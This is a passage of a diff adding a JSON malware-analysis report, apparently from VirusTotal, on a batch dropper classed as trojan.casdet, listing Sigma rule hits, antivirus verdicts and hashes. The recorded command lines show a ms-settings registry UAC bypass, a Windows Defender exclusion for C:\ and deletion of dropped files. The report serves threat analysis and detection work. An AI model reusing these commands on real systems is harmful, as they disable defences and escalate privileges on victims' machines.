+                  "FileVersion": "10.0.22621.2361 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\xkn -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\xkn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "low",
+            "rule_id": "77ed185ff979a8d9206b5eed07bf6d5823529f713ed0ea19f2ef7a4a355568bc",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "File Deletion Via Del",
+            "rule_description": "Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\nAdversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n",
+            "rule_author": "frack113",
+            "match_context": [
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A",
+                  "Description": "Windows Command Processor",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\install.bat\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  del /q \"C:\\Users\\Public\\kn.exe\" / A / F / Q / S  ",
+                  "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\install.bat\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  del /q \"C:\\Users\\Public\\CLEAN.GIF\" / A / F / Q / S  ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\Bruno\\Desktop\\run.bat\" \"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  del /q \"C:\\Users\\Public\\kn.exe\" / A / F / Q / S  ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Windows Command Processor",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\Bruno\\Desktop\\run.bat\" \"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  del /q \"C:\\Users\\Public\\CLEAN.GIF\" / A / F / Q / S  ",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\alpha.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          }
+        ],
+        "size": 3220162,
+        "last_analysis_date": 1757051164,
+        "sigma_analysis_stats": {
+          "critical": 1,
+          "high": 8,
+          "medium": 10,
+          "low": 2
+        },
+        "type_tag": "text",
+        "unique_sources": 20,
+        "magic": "ISO-8859 text, with very long lines (965u), with CRLF line terminators",
+        "type_description": "Text",
+        "meaningful_name": "6a3e2eecb7f7f464c57a7159570d2d55c6893839be852af898089550265f5dfc.unknown",
+        "last_analysis_results": {
+          "Bkav": {
+            "method": "blacklist",
+            "engine_name": "Bkav",
+            "engine_version": "2.0.0.1",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Lionic": {
+            "method": "blacklist",
+            "engine_name": "Lionic",
+            "engine_version": "8.16",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "Trojan.Text.Casdet.4!c"
+          },
+          "MicroWorld-eScan": {
+            "method": "blacklist",
+            "engine_name": "MicroWorld-eScan",
+            "engine_version": "14.0.409.0",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "Trojan.Generic.36550390"
+          },
+          "CTX": {
+            "method": "blacklist",
+            "engine_name": "CTX",
+            "engine_version": "2024.8.29.1",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "unknown.trojan.casdet"
+          },
+          "CAT-QuickHeal": {
+            "method": "blacklist",
+            "engine_name": "CAT-QuickHeal",
+            "engine_version": "22.00",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "Skyhigh": {
+            "method": "blacklist",
+            "engine_name": "Skyhigh",
+            "engine_version": "v2021.2.0+4045",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "BAT/Dropper.l"
+          },
+          "ALYac": {
+            "method": "blacklist",
+            "engine_name": "ALYac",
+            "engine_version": "2.0.0.10",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "Trojan.Generic.36550390"
+          },
+          "Malwarebytes": {
+            "method": "blacklist",
+            "engine_name": "Malwarebytes",
+            "engine_version": "3.1.0.150",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Zillya": {
+            "method": "blacklist",
+            "engine_name": "Zillya",
+            "engine_version": "2.0.0.5439",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "Cynet": {
+            "method": "blacklist",
+            "engine_name": "Cynet",
+            "engine_version": "4.0.3.4",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "CrowdStrike": {
+            "method": "blacklist",
+            "engine_name": "CrowdStrike",
+            "engine_version": "1.0",
+            "engine_update": "20230417",
+            "category": "undetected",
+            "result": null
+          },
+          "K7GW": {
+            "method": "blacklist",
+            "engine_name": "K7GW",
+            "engine_version": "14.4.56927",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "K7AntiVirus": {
+            "method": "blacklist",
+            "engine_name": "K7AntiVirus",
+            "engine_version": "14.4.56927",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Baidu": {
+            "method": "blacklist",
+            "engine_name": "Baidu",
+            "engine_version": "1.0.0.2",
+            "engine_update": "20190318",
+            "category": "undetected",
+            "result": null
+          },
+          "VirIT": {
+            "method": "blacklist",
+            "engine_name": "VirIT",
+            "engine_version": "9.5.1033",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "Trojan.BAT.Agent.GZT"
+          },
+          "Symantec": {
+            "method": "blacklist",
+            "engine_name": "Symantec",
+            "engine_version": "1.22.0.0",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "Trojan Horse"
+          },
+          "ESET-NOD32": {
+            "method": "blacklist",
+            "engine_name": "ESET-NOD32",
+            "engine_version": "31811",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "TrendMicro-HouseCall": {
+            "method": "blacklist",
+            "engine_name": "TrendMicro-HouseCall",
+            "engine_version": "24.550.0.1002",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Avast": {
+            "method": "blacklist",
+            "engine_name": "Avast",
+            "engine_version": "23.9.8494.0",
+            "engine_update": "20250903",
+            "category": "malicious",
+            "result": "Other:Malware-gen [Trj]"
+          },
+          "ClamAV": {
+            "method": "blacklist",
+            "engine_name": "ClamAV",
+            "engine_version": "1.4.3.0",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "Kaspersky": {
+            "method": "blacklist",
+            "engine_name": "Kaspersky",
+            "engine_version": "22.0.1.28",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "HEUR:Trojan.BAT.Generic"
+          },
+          "BitDefender": {
+            "method": "blacklist",
+            "engine_name": "BitDefender",
+            "engine_version": "7.2",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "Trojan.Generic.36550390"
+          },
+          "NANO-Antivirus": {
+            "method": "blacklist",
+            "engine_name": "NANO-Antivirus",
+            "engine_version": "1.0.170.26895",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "ViRobot": {
+            "method": "blacklist",
+            "engine_name": "ViRobot",
+            "engine_version": "2014.3.20.0",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Rising": {
+            "method": "blacklist",
+            "engine_name": "Rising",
+            "engine_version": "25.0.0.28",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "Trojan.Obfus/BAT!1.10165 (CLASSIC)"
+          },
+          "Emsisoft": {
+            "method": "blacklist",
+            "engine_name": "Emsisoft",
+            "engine_version": "2024.8.0.61147",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "Trojan.Generic.36550390 (B)"
+          },
+          "F-Secure": {
+            "method": "blacklist",
+            "engine_name": "F-Secure",
+            "engine_version": "18.10.1547.307",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "DrWeb": {
+            "method": "blacklist",
+            "engine_name": "DrWeb",
+            "engine_version": "7.0.69.6040",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "BAT.MulDrop.137"
+          },
+          "VIPRE": {
+            "method": "blacklist",
+            "engine_name": "VIPRE",
+            "engine_version": "6.0.0.35",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "Trojan.Generic.36550390"
+          },
+          "TrendMicro": {
+            "method": "blacklist",
+            "engine_name": "TrendMicro",
+            "engine_version": "24.550.0.1002",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "McAfeeD": {
+            "method": "blacklist",
+            "engine_name": "McAfeeD",
+            "engine_version": "1.2.0.10275",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "CMC": {
+            "method": "blacklist",
+            "engine_name": "CMC",
+            "engine_version": "2.4.2022.1",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Sophos": {
+            "method": "blacklist",
+            "engine_name": "Sophos",
+            "engine_version": "3.1.2.0",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Ikarus": {
+            "method": "blacklist",
+            "engine_name": "Ikarus",
+            "engine_version": "6.4.16.0",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "Trojan.Script"
+          },
+          "GData": {
+            "method": "blacklist",
+            "engine_name": "GData",
+            "engine_version": "GD:27.41679AVA:64.29765",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "Trojan.Generic.36550390"
+          },
+          "Jiangmin": {
+            "method": "blacklist",
+            "engine_name": "Jiangmin",
+            "engine_version": "16.0.100",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "Varist": {
+            "method": "blacklist",
+            "engine_name": "Varist",
+            "engine_version": "6.6.1.3",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "INI/Agent.DP"
+          },
+          "Avira": {
+            "method": "blacklist",
+            "engine_name": "Avira",
+            "engine_version": "8.3.3.22",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Antiy-AVL": {
+            "method": "blacklist",
+            "engine_name": "Antiy-AVL",
+            "engine_version": "3.0",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "Trojan/Win32.Casdet"
+          },
+          "Kingsoft": {
+            "method": "blacklist",
+            "engine_name": "Kingsoft",
+            "engine_version": "None",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "Win32.Troj.Undef.a"
+          },
+          "Gridinsoft": {
+            "method": "blacklist",
+            "engine_name": "Gridinsoft",
+            "engine_version": "1.0.224.174",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Xcitium": {
+            "method": "blacklist",
+            "engine_name": "Xcitium",
+            "engine_version": "38015",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "Arcabit": {
+            "method": "blacklist",
+            "engine_name": "Arcabit",
+            "engine_version": "2025.0.0.23",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "Trojan.Generic.D22DB6F6"
+          },
+          "SUPERAntiSpyware": {
+            "method": "blacklist",
+            "engine_name": "SUPERAntiSpyware",
+            "engine_version": "5.6.0.1032",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "ZoneAlarm": {
+            "method": "blacklist",
+            "engine_name": "ZoneAlarm",
+            "engine_version": "6.19-108463344",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Microsoft": {
+            "method": "blacklist",
+            "engine_name": "Microsoft",
+            "engine_version": "1.1.25070.4",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "Trojan:Win32/Casdet!rfn"
+          },
+          "Google": {
+            "method": "blacklist",
+            "engine_name": "Google",
+            "engine_version": "1757044871",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "Detected"
+          },
+          "AhnLab-V3": {
+            "method": "blacklist",
+            "engine_name": "AhnLab-V3",
+            "engine_version": "3.28.0.10568",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Acronis": {
+            "method": "blacklist",
+            "engine_name": "Acronis",
+            "engine_version": "1.2.0.121",
+            "engine_update": "20240328",
+            "category": "undetected",
+            "result": null
+          },
+          "VBA32": {
+            "method": "blacklist",
+            "engine_name": "VBA32",
+            "engine_version": "5.4.0",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "TACHYON": {
+            "method": "blacklist",
+            "engine_name": "TACHYON",
+            "engine_version": "2025-09-05.01",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Zoner": {
+            "method": "blacklist",
+            "engine_name": "Zoner",
+            "engine_version": "2.2.2.0",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Tencent": {
+            "method": "blacklist",
+            "engine_name": "Tencent",
+            "engine_version": "1.0.0.1",
+            "engine_update": "20250905",
+            "category": "undetected",
+            "result": null
+          },
+          "Yandex": {
+            "method": "blacklist",
+            "engine_name": "Yandex",
+            "engine_version": "5.5.2.24",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "TrellixENS": {
+            "method": "blacklist",
+            "engine_name": "TrellixENS",
+            "engine_version": "6.0.6.653",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "BAT/Dropper.l"
+          },
+          "huorong": {
+            "method": "blacklist",
+            "engine_name": "huorong",
+            "engine_version": "49d0ae1:49d0ae1:054d44c:054d44c",
+            "engine_update": "20250904",
+            "category": "malicious",
+            "result": "Trojan/BAT.Agent.cr"
+          },
+          "MaxSecure": {
+            "method": "blacklist",
+            "engine_name": "MaxSecure",
+            "engine_version": "1.0.0.1",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "Fortinet": {
+            "method": "blacklist",
+            "engine_name": "Fortinet",
+            "engine_version": "7.0.30.0",
+            "engine_update": "20250905",
+            "category": "malicious",
+            "result": "BAT/Agent.NKM!tr"
+          },
+          "AVG": {
+            "method": "blacklist",
+            "engine_name": "AVG",
+            "engine_version": "23.9.8494.0",
+            "engine_update": "20250903",
+            "category": "malicious",
+            "result": "Other:Malware-gen [Trj]"
+          },
+          "Panda": {
+            "method": "blacklist",
+            "engine_name": "Panda",
+            "engine_version": "4.6.4.2",
+            "engine_update": "20250904",
+            "category": "undetected",
+            "result": null
+          },
+          "alibabacloud": {
+            "method": "blacklist",
+            "engine_name": "alibabacloud",
+            "engine_version": "2.2.0",
+            "engine_update": "20250321",
+            "category": "malicious",
+            "result": "Trojan:Win/Casdet.Gen"
+          },
+          "Avast-Mobile": {
+            "method": "blacklist",
+            "engine_name": "Avast-Mobile",
+            "engine_version": "250904-02",
+            "engine_update": "20250904",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "SymantecMobileInsight": {
+            "method": "blacklist",
+            "engine_name": "SymantecMobileInsight",
+            "engine_version": "2.0",
+            "engine_update": "20250124",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "BitDefenderFalx": {
+            "method": "blacklist",
+            "engine_name": "BitDefenderFalx",
+            "engine_version": "2.0.936",
+            "engine_update": "20250416",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "Elastic": {
+            "method": "blacklist",
+            "engine_name": "Elastic",
+            "engine_version": "4.0.223",
+            "engine_update": "20250902",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "DeepInstinct": {
+            "method": "blacklist",
+            "engine_name": "DeepInstinct",
+            "engine_version": "5.0.0.8",
+            "engine_update": "20250904",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "APEX": {
+            "method": "blacklist",
+            "engine_name": "APEX",
+            "engine_version": "6.694",
+            "engine_update": "20250904",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "Paloalto": {
+            "method": "blacklist",
+            "engine_name": "Paloalto",
+            "engine_version": "0.9.0.1003",
+            "engine_update": "20250905",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "Trapmine": {
+            "method": "blacklist",
+            "engine_name": "Trapmine",
+            "engine_version": "4.0.4.0",
+            "engine_update": "20250819",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "Alibaba": {
+            "method": "blacklist",
+            "engine_name": "Alibaba",
+            "engine_version": "0.3.0.5",
+            "engine_update": "20190527",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "Webroot": {
+            "method": "blacklist",
+            "engine_name": "Webroot",
+            "engine_version": "1.10.0.2",
+            "engine_update": "20250227",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "Cylance": {
+            "method": "blacklist",
+            "engine_name": "Cylance",
+            "engine_version": "3.0.0.0",
+            "engine_update": "20250829",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "SentinelOne": {
+            "method": "blacklist",
+            "engine_name": "SentinelOne",
+            "engine_version": "7.3.0.8",
+            "engine_update": "20250827",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "tehtris": {
+            "method": "blacklist",
+            "engine_name": "tehtris",
+            "engine_version": null,
+            "engine_update": "20250905",
+            "category": "type-unsupported",
+            "result": null
+          },
+          "Trustlook": {
+            "method": "blacklist",
+            "engine_name": "Trustlook",
+            "engine_version": "1.0",
+            "engine_update": "20250905",
+            "category": "type-unsupported",
+            "result": null
+          }
+        },
+        "first_submission_date": 1721024218,
+        "sigma_analysis_summary": {
+          "Sigma Integrated Rule Set (GitHub)": {
+            "critical": 1,
+            "high": 8,
+            "medium": 10,
+            "low": 2
+          }
+        },
+        "popular_threat_classification": {
+          "popular_threat_category": [
+            {
+              "count": 19,
+              "value": "trojan"
+            },
+            {
+              "count": 2,
+              "value": "dropper"
+            }
+          ],
+          "popular_threat_name": [
+            {
+              "count": 5,
+              "value": "casdet"
+            }
+          ],
+          "suggested_threat_label": "trojan.casdet"
+        },
+        "total_votes": {
+          "harmless": 0,
+          "malicious": 3
+        },
+        "magika": "PEM",
+        "sha1": "f2b81ba9aa32b39fa41558f67d2627ab3da72f29",
+        "filecondis": {
+          "dhash": "c78000088486c282",
+          "raw_md5": "8b3b56bc08e622801bce80944768b6e9"
+        },
+        "type_extension": "txt",
+        "type_tags": [
+          "text"
+        ],
+        "sha256": "6a3e2eecb7f7f464c57a7159570d2d55c6893839be852af898089550265f5dfc",
+        "ssdeep": "24576:eIQFfxaplqwu8YYDEWRRm0Dxb3n7o3quNeHt2T6IPGKhCNwPmOyEC5p+gP3m0nlL:eIq5a/h5YYDEcRm0D53UYHQ6hcm5ECR",
+        "tlsh": "T147E593A73EAE16C72706B7AB578FE5140A27DC3D0AC26DC443C7329F542931B6D8096E",
+        "times_submitted": 25,
+        "reputation": -11
+      }
+    }
+  }
+}
